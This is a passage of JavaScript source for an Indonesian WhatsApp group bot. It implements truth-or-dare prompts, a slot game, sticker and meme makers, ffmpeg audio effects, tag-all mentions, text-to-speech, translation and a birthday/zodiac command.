									const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
									const der = dare[Math.floor(Math.random() * dare.length)]
									sendButMessage(from, `${der}`, `${ucapannya}`, [
									{
										buttonId: `dare`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
											limitAdd(sender, limit)
									break
						case 'truth':
									const trut = ['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
									const ttrth = trut[Math.floor(Math.random() * trut.length)]
									sendButMessage(from, `${ttrth}`, `${ucapannya}`, [
									{
										buttonId: `truth`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
											limitAdd(sender, limit)
									break
						case 'slot':
									const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🍐 : 🍊','🍐 : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇 ','🍌 : 🍒 : 🔔','🍐 : ?? :  🔔','🍊 : 🍋 :  🍒','🍋 : 🍋 :  🍌','?? : 🔔 : 🍇','🔔 : 🍐 :  🍇','🔔 : 🔔 :  🔔','🍒 : 🍒 :  🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
									somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
									somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]
									somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
									rn = randomNomor(100)
									if (somtoyy== '🍌 : 🍌 : 🍌') {
										bp = await sendButMessage(from, `─「 🎰 *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
									{
										buttonId: `slot`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
										addBalance(sender, rn, balance)
										} else if (somtoyy == '🍒 : 🍒 : 🍒') {
									bp = await sendButMessage(from, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
									{
										buttonId: `slot`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
									addBalance(sender, rn, balance)
										} else if (somtoyy == '🔔 : 🔔 : 🔔') {
											bp = await sendButMessage(from, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
											addBalance(sender, rn, balance)
												} else if (somtoyy == '🍐 : 🍐 : 🍐') {
													bp = await sendButMessage(from, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
													addBalance(sender, rn, balance)
														} else if (somtoyy == '🍇 : 🍇 : 🍇') {
															bp = await sendButMessage(from, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
															addBalance(sender, rn, balance)
																} else {
																	ok = await sendButMessage(from, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲  *YOU LOSE*  ❳──\nXP BERKURANG 1000`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
																	addLevelingXp(sender, -1000)
																	}
																	limitAdd(sender, limit)
															break
						case 'attp':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}attp* teks`)
									let ane = await getBuffer(`https://api.xteam.xyz/attp?file&text=${q}`)
									fs.writeFileSync('./sticker/attp.webp', ane)
									Zeeone.sendMessage(from, fs.readFileSync(`./sticker/attp.webp`), sticker, {quoted: Ofc})
									limitAdd(sender, limit)
									break
						case 'memegenerator': case 'memegen':
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
									if (!q.includes('|')) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
									try {
										if (!isQuotedImage && !isQuotedSticker) return reply(`Reply Gambar Atau Sticker!`)
										reply(mess.wait)
										var teks1 = q.split('|')[0] ? q.split('|')[0] : ''
										var teks2 = q.split('|')[1] ? q.split('|')[1] : ''
										var imgbb = require('imgbb-uploader')
										var enmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										var media = await Zeeone.downloadAndSaveMediaMessage(enmedia)
										var njay = await uploadImages(media)
										var resu = await getBuffer(`https://api.memegen.link/images/custom/${teks1}/${teks2}.png?background=${njay}`)
										Zeeone.sendMessage(from, resu, image, {thumbnail: thumbnail, quoted: Ofc})
										fs.unlinkSync(media)
										} catch (e) {
											return reply(`${e}`)
											console.log(e)
										}
										limitAdd(sender, limit)
									break
						case 'stickermeme': case 'memesticker': case 'memestick': case 'stickmeme': case 'stcmeme': case 'smeme':
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									try {
										if (!q) return reply(`${prefix+command} Alphabot|Zeeone`)
										var bawah = q.replace('', '_').replace('\n','%5Cn').replace('?', '~q').replace('%', '~p').replace('&', '~a').replace('#', '~h').replace('/', '~s')
										if ( isQuotedImage) {
											reply(mess.wait)
											var imgbb = require('imgbb-uploader')
											let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
											let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
											var tolink = await uploadImages(media)
											var sticknye = `https://api.memegen.link/images/custom/-/${bawah}.png?background=${tolink}`
											fs.writeFileSync('./sticker/smemek.webp', sticknye)
											if (error) return reply(mess.error)
												Zeeone.sendMessage(from, fs.readFileSync(`./sticker/smemek.webp`), sticker, { quoted: Ofc })
												} else if (isQuotedSticker){
													reply(mess.wait)
													var imgbb = require('imgbb-uploader')
													let encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
													let media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
													let ran = getRandom('.png')
													exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
														fs.unlinkSync(media)
														if (err) return reply('Error')
														var tolink = await uploadImages(media)
														var sticknye = `https://api.memegen.link/images/custom/-/${bawah}.png?background=${tolink}`
														fs.writeFileSync('./sticker/smemek.webp', sticknye)
														if (error) return reply(mess.error)
															Zeeone.sendMessage(from, fs.readFileSync(`./sticker/smemek.webp`), sticker, { quoted: Ofc })
															fs.unlinkSync(ran)
														
														})
														} else {
															reply(`Reply gambar atau sticker dengan Caption ${prefix+command} teks`)
															}
														} catch (e) {
															return reply(`${e}`)
															console.log(e)
														}
														limitAdd(sender, limit)
													break
						case 'emoji':case 'semoji':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!q) return reply(`Example : ${prefix + command} 😂`)
									hex2 = args.join(' ') 
									emoji.get(`${hex2}`).then(emoji => {
										teks = `${emoji.images[4].url}`
										sendStickerFromUrl(from,`${teks}`)
									})
									limitAdd(sender, limit)
									break
						case 'stickerwm': case 'swm': case 'take': case 'takesticker': case 'takestick':{
									if (!Ofc.key.fromMe && !isPremium) return reply(mess.only.prem)
									reply(mess.wait) 
									let packname1 = q.split('|')[0] ? q.split('|')[0] : q
									let author1 = q.split('|')[1] ? q.split('|')[1] : ''
									if (isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
										exif.create(packname1, author1, `stickwm_${sender}`)
										await ffmpeg(`${media}`)
										.input(media)
										.on('start', function (cmd) {
											console.log(color(`STARTED : ${cmd}`,'yellow'))
											})
											.on('error', function (err) {
												console.log(color(`ERROR : ${err}`,'red'))
												fs.unlinkSync(media)
												reply(mess.error)
												})
												.on('end', function () {
													console.log(color(`FINISH`,'magenta'))
													exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
														if (error) return reply(mess.error)
														Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
														fs.unlinkSync(media)
														fs.unlinkSync(`./sticker/${sender}.webp`)
														fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
														})
														})
														.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
														.toFormat('webp')
														.save(`./sticker/${sender}.webp`)
														} else if (( isQuotedVideo && Ofc.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
															let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
															let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
															exif.create(packname1, author1, `stickwm_${sender}`)
															reply(mess.wait)
															await ffmpeg(`${media}`)
															.inputFormat(media.split('.')[4])
															.on('start', function (cmd) {
																console.log(color(`STARTED : ${cmd}`,'yellow'))
																})
																.on('error', function (err) {
																	console.log(color(`ERROR : ${err}`,'red'))
																	fs.unlinkSync(media)
																	let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
																	reply(mess.error)
																	})
																	.on('end', function () {
																		console.log((`FINISH`,'magenta'))
																		exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
																			if (error) return reply(mess.error)
																			Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
																			fs.unlinkSync(media)
																			fs.unlinkSync(`./sticker/${sender}.webp`)
																			fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
																			})
																			})
																			.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
																			.toFormat('webp')
																			.save(`./sticker/${sender}.webp`)
																			} else if (isQuotedSticker) {
																				let encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
																				let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
																				exif.create(packname1, author1, `takestick_${sender}`)
																				exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
																				if (error) return reply(mess.error)
																				Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
																				fs.unlinkSync(media)
																				fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
																				})
																				} else {
																					reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
																				 }
																			}
																	 break
						case 'sticker': case 'stiker':  case 'stickergif': case 'stikergif': case 'sgif': case 's':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if ( isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
										await ffmpeg(`${media}`)
										.input(media)
										.on('start', function (cmd) {
											console.log(color(`STARTED : ${cmd}`))
											})
											.on('error', function (err) {
												console.log(color(`ERROR : ${err}`))
												fs.unlinkSync(media)
												reply(mess.error)
												})
												.on('end', function () {
													console.log(color(`FINISH`,'magenta'))
													exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
														if (error) return reply(mess.error)
														Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
														limitAdd(sender, limit)
														fs.unlinkSync(media)
														fs.unlinkSync(`./sticker/${sender}.webp`)
														})
														})
														.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
														.toFormat('webp')
														.save(`./sticker/${sender}.webp`)
														} else if ((isQuotedVideo && Ofc.message.videoMessage.fileLength < 10000000 || isQuotedVideo && Ofc.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
															let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
															let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
															reply(mess.wait)
															await ffmpeg(`${media}`)
															.inputFormat(media.split('.')[4])
															.on('start', function (cmd) {
																console.log(color(`STARTED : ${cmd}`))
																})
																.on('error', function (err) {
																	console.log(color(`ERROR : ${err}`))
																	fs.unlinkSync(media)
																	let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
																	reply(mess.error)
																	})
																	.on('end', function () {
																		console.log(color(`FINISH`,'magenta'))
																		exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
																			if (error) return reply(mess.error)
																			Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
																			limitAdd(sender, limit)
																			fs.unlinkSync(media)
																			fs.unlinkSync(`./sticker/${sender}.webp`)
																			})
																			})
																			.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
																			.toFormat('webp')
																			.save(`./sticker/${sender}.webp`)
																			} else {
																				reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
																				}
																				limitAdd(sender, limit)
												break
						case 'exif':
									if (!Ofc.key.fromMe && !isOwner)return reply(mess.only.owner)
									if (args.length < 1) return reply(`Penggunaan ${prefix}exif nama|author`)
									if (!arg.split('|')) return reply(`Penggunaan ${prefix}exif nama|author`)
									exif.create(arg.split('|')[0], arg.split('|')[1])
									reply('Sukses Lord')
									break
						case 'owner':{
							const ownerContact = [owner_number, "", "", "", "", "", "", "", "", "", ""]
							let ini_list = []
							for (let i of ownerContact.map(v => v + '@s.whatsapp.net')) {
								const vname = Zeeone.contacts[i] != undefined ? Zeeone.contacts[i].vname || Zeeone.contacts[i].notify : undefined
								ini_list.push({
									"displayName": `${owner_name}`,
									"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
									})
									}
									hehe = await Zeeone.sendMessage(from, {
										"displayName": `${ini_list.length} kontak`,
										"contacts": ini_list 
										}, 'contactsArrayMessage', { quoted: Ofc })
										Zeeone.sendMessage(from, `Nih Kak Contact Owner Ku ✨`, text, {quoted: hehe})
										}
										break
						case 'lirik':
									if (args.length < 1) return reply('Judulnya?')
									reply(mess.wait)
									teks = body.slice(7)
									lirikLagu(teks).then((res) => {
										let lirik = `*Hasil Pencarian Dari : ${q}*
										\n${res[0].result}`
										reply(lirik)
									})
									break
						case 'ultah': case 'hbd':
									if (args.length < 1) return reply(`Usage : #ultah tahun-bulan-tanggal\nExample : #ultah 2004-01-12`)
									if (!args[0].includes("-")) return reply(`Usage : #ultah tahun-bulan-tanggal\nExampla : #ultah 2006-01-12`)
									qq = q
									zodiakk = [
									["Capricorn", new Date(1970, 0, 1)],
									["Aquarius", new Date(1970, 0, 20)],
									["Pisces", new Date(1970, 1, 19)],
									["Aries", new Date(1970, 2, 21)],
									["Taurus", new Date(1970, 3, 21)],
									["Gemini", new Date(1970, 4, 21)],
									["Cancer", new Date(1970, 5, 22)],
									["Leo", new Date(1970, 6, 23)],
									["Virgo", new Date(1970, 7, 23)],
									["Libra", new Date(1970, 8, 23)],
									["Scorpio", new Date(1970, 9, 23)],
									["Sagittarius", new Date(1970, 10, 22)],
									["Capricorn", new Date(1970, 11, 22)]
									].reverse()
									function getZodiac(month, day) {
										dey = new Date(1970, month - 1, day)
										return zodiakk.find(([_,_d]) => dey >= _d)[0]
										}
										dateek = new Date(qq)
										if (dateek == 'Invalid Date') throw dateek
										let dd = new Date()
										let [tahun, bulan, tanggal] = [dd.getFullYear(), dd.getMonth() + 1, dd.getDate()]
										birth = [dateek.getFullYear(), dateek.getMonth() + 1, dateek.getDate()]
										zodiackk = getZodiac(birth[1], birth[2])
										ageD = new Date(d - dateek)
										agek = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()
										birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
										cekusia = bulan === birth[1] && tanggal === birth[2] ? `Selamat ulang tahun yang ke-${agek} 🥳` : agek
										reply(`
*Lahir : ${birth.join(', ')}*
*Ultah Mendatang : ${birthday.join(', ')}*
*Usia : ${cekusia}*
*Zodiak : ${zodiackk}*
`.trim())
									break
						case 'bass': 
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									ran = getRandom('.mp3')
									exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
										fs.unlinkSync(media)
										if (err) return reply('Error!')
										hah = fs.readFileSync(ran)
										Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
										break
						case 'slowmo': case 'slow':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									try {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.mp3')
										exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
											fs.unlinkSync(media)
											if (err) return reply('Error!')
											uhh = fs.readFileSync(ran)
											Zeeone.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc,duration:999999999999})
											fs.unlinkSync(ran)
											})
											} catch (e) {
												reply(mess.error)
												}  
												limitAdd(sender, limit)
									break
						case 'fast':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									try {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.mp3')
										exec(`ffmpeg -i ${media} -filter:a "atempo=1.3,asetrate=43000" ${ran}`, (err, stderr, stdout) => {
											fs.unlinkSync(media)
											if (err) return reply('Error!')
											hah = fs.readFileSync(ran)
											Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc})
											fs.unlinkSync(ran)
											})
											} catch (e) {
												reply(mess.error)
												}  
										limitAdd(sender, limit)
									break
						case 'robot':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									ran = getRandom('.mp3')
									exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
										fs.unlinkSync(media)
										if (err) return reply('Error!')
										hah = fs.readFileSync(ran)
										Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
									break
						case 'detikvn': case 'setdetikvn': case 'setdurasi':
									if (!Number(args[0])) return reply(`EXAMPLE : ${prefix + command} 50`)
									reply(mess.wait)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									cokmatane = Number(args[0])
									hah = fs.readFileSync(media)
									Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted: Ofc})
									fs.unlinkSync(media)
									limitAdd(sender, limit)
									break
						case 'tupai':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									try {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.mp3')
										exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
											fs.unlinkSync(media)
											if (err) return reply('Error!')
											hah = fs.readFileSync(ran)
											Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: Ofc,duration:99})
											fs.unlinkSync(ran)
											})
											 } catch (e) {	
												reply(mess.error)
												}  	
												limitAdd(sender, limit)
												break
						case 'vibra': case 'vibrato':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									ran = getRandom('.mp3')
									exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=16" ${ran}`, (err, stderr, stdout) => {
										fs.unlinkSync(media)
										if (err) return reply('Error!')
										hah = fs.readFileSync(ran)
										Zeeone.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
									break
						case 'tinyurl':{
									if (args.length < 1) return reply(`Masukkan link`)
									if (!isUrl) return reply(`Masukkan link`)
									const fetchText = (url, optiono) => {
										return new Promise((resolve, reject) => {
											return fetch(url, optiono)
											.then(response => response.text())
											.then(text => resolve(text))
											.catch(err => {
												console.log(color(err,'red'))
												reject(err)
												})
											})
										}
										okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
										shorti = `*Result : ${okok}*`
										reply(shorti)
										}
									break
						case 'infoall': case 'tagall':
									if (!isGroupAdmins && !Ofc.key.fromMe && !isOwner) return reply(mess.only.admin)
									if (!isGroup) return reply(mess.only.group)
									var nom = Ofc.participant
									members_id = []
									teks = ''
									for (let mem of groupMembers) {
										teks += `│ *@${mem.jid.split('@')[0]}*\n`
										members_id.push(mem.jid)
										}
										mentions(`「 *TAG ALL*  」
${q?`\nPesan : `+q:``}
							
${teks}`, members_id, true)
									break
						case 'hidetag': 
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										hideTag(from, `${q}`) 
										} else {  
											quotedText = Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation
											hideTag(from, `${quotedText}`)
											}
									break
						case 'tts': case 'say':
									try {if (args.length > 50) return reply('```Error, Teks Terlalu Panjang!```')
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										const gtts = require('./lib/gtts')(args[0])
										dtt = body.slice(8)
										ranm = getRandom('.mp3')
										rano = getRandom('.ogg')
										dtt.length > 50
										? reply('```Error, Teks Terlalu Panjang!```')
										: gtts.save(ranm, dtt, function() {
											exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
												fs.unlinkSync(ranm)
												buff = fs.readFileSync(rano)
												if (err) return reply(mess.error)
												Zeeone.sendMessage(from, buff, audio, {quoted: Ofc, ptt:true})
												fs.unlinkSync(rano)
												})
												})
												} else {
													const gtts = require('./lib/gtts')(args[0]?args[0]:'id')
													dtt = Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation
													ranm = getRandom('.mp3')
													rano = getRandom('.ogg')
													dtt.length > 50
													? reply('```Error, Teks Terlalu Panjang!```')
													: gtts.save(ranm, dtt, function() {
														exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
															fs.unlinkSync(ranm)
															buff = fs.readFileSync(rano)
															if (err) return reply(mess.error)
															Zeeone.sendMessage(from, buff, audio, {quoted: Ofc, ptt:true})
															fs.unlinkSync(rano)
															})
														})
													}
												} catch (e) {
													reply(`${e}`)
													}
												limitAdd(sender, limit)
											break
						case 'translate': case 'tr':
									try {
										if (args.length < 1)return reply(`Usage : #translate kode bahasa teks/reply pesan\nExample : #translate id why`)
										if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
											translate(`${body.slice(10+args[0].length+1)}`, args[0])
											.then((res) => { reply(`${res}`) })
											} else {
												tolang = args[0]
												entah = Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation
												translate(entah, tolang)
												.then((res) => { reply(`${res}`) })
												}
											} catch (e) {
												reply(`${e}`)
												}
											break
						case 'mystat': case 'stats': case 'botstat': case 'infobot':{
									try {
										let totalchat = await Zeeone.chats.all()
										let i = []
										let giid = []
										for (let mem of totalchat){
											i.push(mem.jid)
											}
											for (let id of i){
												if (id && id.includes('g.us')){
													giid.push(id)
													}
												}
												const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = Zeeone.user.phone
												nupe = owner_number + '@s.whatsapp.net'
												teks = `「 *BOT STATISTIC* 」 

🔖 Botname : ${namabot}
🔖 Owner : @${nupe.split("@")[0]}
